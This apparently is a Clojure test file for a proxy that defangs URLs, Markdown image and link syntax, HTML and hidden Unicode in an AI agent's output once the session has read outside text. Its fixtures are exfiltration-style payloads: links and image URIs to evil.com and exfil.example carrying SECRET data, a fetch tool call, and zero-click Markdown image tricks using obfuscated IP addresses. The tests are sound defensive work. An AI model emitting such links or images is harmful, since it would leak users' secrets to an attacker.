(ns relay.inert-hub-test
  "Conversation text made inert in relay's proxy (relay#104): what the
  hub writes to a client for an agent's session/update, when the
  session may hold outside text and when it does not."
  (:require [clojure.string :as str]
            [clojure.walk :as walk]
            [clojure.test :refer [deftest is testing]]
            [relay.core :as core]
            [relay.core-test :as ct]
            [relay.hub-test :as ht]
            [relay.text :as text]))

(def fund "https://grants.example.org/fund?year=2027")
(def fund-broken "hxxps://grants[.]example[.]org/fund?year=2027")

(defn- state-with-link
  "relay's state with `fund` kept live by the operator."
  []
  (first (core/run-command core/empty-state {:type :link/keep :actor "operator" :labels [] :args {:url fund}}
                           {:now ht/t0 :config ct/cfg})))

(defn- live
  "The clerk's conversation live as session s1 on connection 1, its
  session started with `labels` (nil: relay was told none)."
  [labels]
  (let [h (-> (ht/fresh) (ht/opened 1))
        [h] (ht/run h {:event :log-changed :roster ht/roster :state (state-with-link)})
        [h] (ht/say h 1 (ht/req 1 "initialize" {:protocolVersion 1 :clientCapabilities {}}))
        [h] (ht/say h 1 (ht/req 2 "session/new" {:cwd "/w" :mcpServers [] :_meta {"relay/role" "clerk"}}))
        [h] (ht/run h (cond-> {:event :conversation-started :role "clerk" :wake 7} (some? labels) (assoc :labels labels)))
        [h] (ht/agent h "clerk" (ht/res 1 {:protocolVersion 1}))
        [h] (ht/agent h "clerk" (ht/res 2 {:sessionId "s1"}))]
    h))

(defn- update-line [u] (ht/note "session/update" {:sessionId "s1" :update u}))
(defn- text-chunk [kind t] (update-line {:sessionUpdate kind :content {:type "text" :text t}}))

(defn- feed
  "The hub after the agent's updates, and the updates connection 1 was
  written."
  [h & lines]
  (reduce (fn [[h ws] l]
            (let [[h fx] (ht/agent h "clerk" l)]
              [h (into ws (keep #(get-in % ["params" "update"]) (ht/writes fx 1)))]))
          [h []] lines))

(defn- ended
  "The updates written to connection 1 once the conversation ends."
  [h]
  (let [[_ fx] (ht/run h {:event :conversation-gone :role "clerk"})]
    (keep #(get-in % ["params" "update"]) (ht/writes fx 1))))

(defn- texts [kind us]
  (apply str (keep #(when (= kind (get % "sessionUpdate")) (get-in % ["content" "text"])) us)))

(deftest a-reply-from-outside-reaches-the-client-inert-however-it-was-cut
  (let [[h ws] (feed (live ["contaminated"])
                     (text-chunk "agent_message_chunk" "see https://ev")
                     (text-chunk "agent_message_chunk" "il.com/x?d=SECRET and ")
                     (text-chunk "agent_message_chunk" "www.exfil.example now"))
        all (concat ws (ended h))]
    (is (= "see hxxps://evil[.]com/x?d=SECRET and www[.]exfil[.]example now" (texts "agent_message_chunk" all)))
    (testing "no part of a word goes out before the word is whole"
      (is (not-any? #(re-find #"https?:" (str (get-in % ["content" "text"]))) ws)))))

(deftest a-word-cut-by-a-tool-call-is-sent-broken
  (let [[_ ws] (feed (live ["contaminated"])
                     (text-chunk "agent_message_chunk" "open https://evil.co")
                     (update-line {:sessionUpdate "tool_call" :toolCallId "c1" :title "fetch https://evil.com/x"
                                   :rawInput {"url" "https://evil.com/x?d=1"} :locations [{"path" "/w/notes.md"}]})
                     (text-chunk "agent_message_chunk" "m/x done"))
        call (first (filter #(= "tool_call" (get % "sessionUpdate")) ws))]
    (is (not (re-find #"https?://|evil\.co" (texts "agent_message_chunk" ws))))
    (is (str/starts-with? (texts "agent_message_chunk" ws) "open "))
    (testing "the call itself is inert, its paths as they are"
      (is (= "fetch hxxps://evil[.]com/x" (get call "title")))
      (is (= {"url" "hxxps://evil[.]com/x?d=1"} (get call "rawInput")))
      (is (= [{"path" "/w/notes.md"}] (get call "locations"))))))

(deftest a-session-relay-was-told-no-labels-of-counts-as-outside
  (let [[h ws] (feed (live nil) (text-chunk "agent_message_chunk" "see https://evil.com/x "))]
    (is (= "see hxxps://evil[.]com/x " (texts "agent_message_chunk" (concat ws (ended h)))))))

(deftest a-clean-session-is-passed-on-as-it-came
  (let [[_ ws] (feed (live []) (text-chunk "agent_message_chunk" "see https://ev")
                     (text-chunk "agent_message_chunk" "il.com/x"))]
    (is (= ["see https://ev" "il.com/x"] (map #(get-in % ["content" "text"]) ws))))
  (testing "until its labels say it read outside text"
    (let [[h ws] (feed (live [])
                       (update-line {:sessionUpdate "tool_call_update" :toolCallId "c1" :status "completed"
                                     :_meta {"agentloop/labels" ["contaminated"]}})
                       (text-chunk "agent_message_chunk" "now https://evil.com/x "))]
      (is (= "now hxxps://evil[.]com/x " (texts "agent_message_chunk" (concat ws (ended h))))))))

(deftest a-live-link-travels-beside-the-text-of-a-message-only
  (let [[h ws] (feed (live ["contaminated"])
                     (text-chunk "agent_thought_chunk" (str "thinking of " fund " "))
                     (text-chunk "agent_message_chunk" (str "Apply at " fund ". "))
                     (text-chunk "agent_message_chunk" "And https://evil.example/x "))
        msgs (filter #(= "agent_message_chunk" (get % "sessionUpdate")) ws)
        listed (keep #(get-in % ["_meta" "relay/links"]) msgs)]
    (is (= [[{"address" fund "shown" fund-broken}]] listed))
    (is (str/includes? (texts "agent_message_chunk" ws) fund-broken))
    (is (not-any? #(get-in % ["_meta" "relay/links"]) (remove #(= "agent_message_chunk" (get % "sessionUpdate")) ws))
        "a thought lists none")
    (testing "the replay holds the same text and lists the link again"
      (let [[h] (ht/say h 2 (ht/req 9 "initialize" {:protocolVersion 1 :clientCapabilities {}}))
            h (ht/opened h 2)
            [_ fx] (ht/say h 2 (ht/req 10 "session/load" {:sessionId "s1" :cwd "/w" :mcpServers []}))
            replayed (keep #(get-in % ["params" "update"]) (ht/writes fx 2))]
        (is (= (texts "agent_message_chunk" ws) (texts "agent_message_chunk" replayed)))
        (is (some #(= [{"address" fund "shown" fund-broken}] (get-in % ["_meta" "relay/links"])) replayed))))))

(deftest a-block-that-is-not-text-becomes-text-that-names-it
  (let [[_ ws] (feed (live ["contaminated"])
                     (update-line {:sessionUpdate "agent_message_chunk"
                                   :content {:type "image" :mimeType "image/png" :data "AAAA"
                                             :uri "https://exfil.example/p.png?d=SECRET"}})
                     (update-line {:sessionUpdate "agent_message_chunk"
                                   :content {:type "resource_link" :name "report" :uri "https://exfil.example/r?d=1"}}))]
    (is (= ["text" "text"] (map #(get-in % ["content" "type"]) ws)))
    (is (= ["image hxxps://exfil[.]example/p[.]png?d=SECRET" "resource_link report hxxps://exfil[.]example/r?d=1"]
           (map #(get-in % ["content" "text"]) ws)))))

(deftest hidden-characters-are-shown-and-emoji-kept-whole
  (let [[h ws] (feed (live ["contaminated"]) (text-chunk "agent_message_chunk" "a\u202ex \ud83d\udc68\u200d\ud83d\udc69 C:\\x "))]
    (is (= "a\\u{202e}x \ud83d\udc68\u200d\ud83d\udc69 C:\\\\x " (texts "agent_message_chunk" (concat ws (ended h)))))))

;; --- relay#104's first review round

(deftest a-call-s-raw-input-has-its-keys-broken-too
  ;; The model writes a call's input as JSON, keys and all.
  (let [[_ ws] (feed (live ["contaminated"])
                     (update-line {:sessionUpdate "tool_call" :toolCallId "c1" :title "t"
                                   :rawInput {"https://evil.com/x?d=SECRET" "v​"}}))]
    (is (= {"hxxps://evil[.]com/x?d=SECRET" "v\\u{200b}"} (get (first ws) "rawInput")))))

(deftest held-text-goes-out-in-the-message-it-came-from
  (let [[h ws] (feed (live ["contaminated"])
                     (update-line {:sessionUpdate "agent_message_chunk" :messageId "a1"
                                   :content {:type "text" :text "the answer is 42"}})
                     (update-line {:sessionUpdate "agent_message_chunk" :messageId "a2"
                                   :content {:type "text" :text "Next part "}}))
        all (concat ws (ended h))
        by-id (group-by #(get % "messageId") all)]
    (is (= "the answer is 42" (texts "agent_message_chunk" (get by-id "a1"))))
    (is (= "Next part " (texts "agent_message_chunk" (get by-id "a2"))))
    (is (not (contains? by-id nil)) "every piece names its message")))

(deftest a-session-that-turns-clean-sends-what-it-held-first
  (let [[_ ws] (feed (live nil)
                     (text-chunk "agent_message_chunk" "see https://ev")
                     (update-line {:sessionUpdate "usage_update" :used 1 :size 2 :_meta {"agentloop/labels" []}})
                     (text-chunk "agent_message_chunk" "il.com/x done"))]
    (is (= ["agent_message_chunk" "agent_message_chunk" "usage_update" "agent_message_chunk"]
           (map #(get % "sessionUpdate") ws)))
    (is (= "see hxxps://ev" (texts "agent_message_chunk" (take 2 ws))))))

(deftest a-display-block-is-not-made-inert-twice
  ;; The proxy makes a display's text inert itself; escaping it again
  ;; would show its escapes doubled.
  (let [block {:type "text" :text "a\\u{200b}b" :_meta {"relay/display" {"title" "t" "body" "b"}}}
        [_ ws] (feed (live ["contaminated"])
                     (update-line {:sessionUpdate "tool_call_update" :toolCallId "c1"
                                   :content [{:type "content" :content block}]}))]
    (is (= "a\\u{200b}b" (get-in (first ws) ["content" 0 "content" "text"])))))

;; --- relay#104's second review round

(deftest markdown-that-would-fetch-or-link-reaches-a-client-as-text
  ;; A client that renders Markdown fetches an image with no click,
  ;; whatever form its address takes. relay escapes the three pieces of
  ;; CommonMark that make a link, an image or HTML.
  (let [[h ws] (feed (live ["contaminated"])
                     (text-chunk "agent_message_chunk"
                                 "Done. ![chart](//8.8.2056/c.png?d=S) <img src=//134744072/p?d=S> [here](//0x8.8.8.8/x)\n[1]: //evil/x "))
        out (texts "agent_message_chunk" (concat ws (ended h)))]
    (is (not (re-find #"\]\(|\]:|(?<!\\)<" out)) out)
    (is (str/includes? out "![chart]\\(//8.8.2056/c[.]png?d=S)") out)))

(deftest a-call-s-name-is-broken-too
  ;; agentloop passes on the tool name the model emitted.
  (let [[_ ws] (feed (live ["contaminated"])
                     (update-line {:sessionUpdate "tool_call" :toolCallId "c" :title "fetch" :name "https://evil.com/?d=S​"}))]
    (is (= "hxxps://evil[.]com/?d=S\\u{200b}" (get (first ws) "name")))))

(deftest a-content-block-of-any-type-in-a-call-is-made-inert
  (let [[_ ws] (feed (live ["contaminated"])
                     (update-line {:sessionUpdate "tool_call_update" :toolCallId "c"
                                   :content [{:type "text" :text "see https://evil.com/x"}
                                             {:type "content" :content {:type "image" :uri "https://evil.com/p.png"
                                                                        :_meta {"relay/display" nil}}}]}))
        content (get (first ws) "content")]
    (is (= "see hxxps://evil[.]com/x" (get-in content [0 "text"])))
    (is (= "text" (get-in content [1 "content" "type"])) "a display key on a block that is not text saves nothing")))

;; --- relay#136

(deftest a-text-free-update-leaves-the-held-word-whole
  ;; agentloop sends a usage_update after an assistant message's chunks,
  ;; so the message's last word is still held when it comes.
  (doseq [between [{:sessionUpdate "usage_update" :used 1 :size 2 :_meta {"agentloop/labels" ["contaminated"]}}
                   {:sessionUpdate "session_info_update" :_meta {"agentloop/labels" ["contaminated"]}}
                   {:sessionUpdate "current_mode_update" :currentModeId "ask"}]]
    (testing (:sessionUpdate between)
      (let [whole "Meet at 10:30, e.g. at https://evil.com/x?d=S then"
            [h ws] (feed (live ["contaminated"])
                         (text-chunk "agent_message_chunk" "Meet at 10:")
                         (update-line between)
                         (text-chunk "agent_message_chunk" "30, e.g. at https://evil.com/x?d=S then"))
            all (concat ws (ended h))]
        (is (= (text/conversation-text whole) (texts "agent_message_chunk" all)))
        (is (= (walk/stringify-keys between) (first (filter #(= (:sessionUpdate between) (get % "sessionUpdate")) all)))
            "and the update passes as it came")))))

(deftest an-update-that-carries-text-still-cuts-the-held-word
  (let [[h ws] (feed (live ["contaminated"])
                     (text-chunk "agent_message_chunk" "Meet at 10:")
                     (update-line {:sessionUpdate "session_info_update" :title "a title"})
                     (text-chunk "agent_message_chunk" "30 sharp"))
        all (concat ws (ended h))]
    (is (= "Meet at 10[:\\]30 sharp" (texts "agent_message_chunk" all)))))
